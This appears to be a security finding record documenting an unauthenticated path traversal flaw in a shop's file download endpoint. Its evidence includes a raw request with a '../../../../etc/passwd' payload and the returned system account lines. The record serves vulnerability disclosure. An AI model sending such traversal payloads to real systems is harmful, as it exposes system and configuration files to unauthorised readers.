title: Path traversal in file download endpoint
notes:
Arbitrary file read via path traversal in GET /api/download?file=../../../../etc/passwd.
Attacker can read system files (/etc/passwd, application configuration) without authentication.

evidence.name: path-traversal.png
evidence.text:
GET /api/download?file=../../../../etc/passwd HTTP/1.1
Host: shop.acme.test

HTTP/1.1 200 OK
Content-Type: text/plain

root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
admin:x:1001:1001:Shop Admin:/home/admin:/bin/bash
